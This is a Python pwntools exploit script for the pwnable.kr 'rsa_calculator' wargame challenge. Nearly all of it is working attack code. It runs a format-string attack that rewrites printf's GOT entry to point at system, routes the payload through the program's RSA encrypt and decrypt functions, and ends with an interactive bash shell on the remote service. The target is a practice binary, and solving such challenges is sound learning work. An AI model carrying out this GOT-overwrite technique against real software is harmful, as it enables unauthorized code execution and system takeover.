#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host pwnable.kr --port 9012 ./rsa_calculator
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./rsa_calculator')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'pwnable.kr'
port = int(args.PORT or 9012)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x0000000000401238
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)


def set_key(p, q, e, d): 
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'p : ', p)
    io.sendlineafter(b'q : ', q)
    io.sendlineafter(b'set public key exponent e : ', e)
    io.sendlineafter(b'set private key exponent d : ', d)


def encrypt(data):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'how long is your data?(max=1024) : ', b'1024')
    io.sendlineafter(b'paste your plain text data\n', data)
    io.recvline()

    return io.recvline(keepends=False)


def decrypt(data):
    io.sendline(b'3')
    io.sendline(b'1000')
    io.sendline(data)
    io.recvline()

    return io.recvline(keepends=False)



printf_plt_address = p64(0x602028)
printf_plt_address2 = p64(0x60202c)

system_address = 0x4007c0

# writing 0x00000000 to the higher 4 bytes of the printf_plt_address
# and the system address to the lower 4 bytes
format_string_payload = f'%32$n%{system_address}d%31$n'

io = start()

# setting valid keys
set_key(b'17', b'23', b'7', b'151')

# encrypting bash string (that we'll use later) 
encrypted_bash_string = encrypt(b'bash')

# getting the encrypted format_string_payload
encrypted_format_string_payload = encrypt(bytes(format_string_payload, 'utf-8'))

# decrypting it in order to have it printf'd + adding the vars we write to
decrypt(encrypted_format_string_payload + printf_plt_address + printf_plt_address2)

# decrypting bash string in order to have it printf'd (system'd)
decrypt(encrypted_bash_string)

io.interactive()
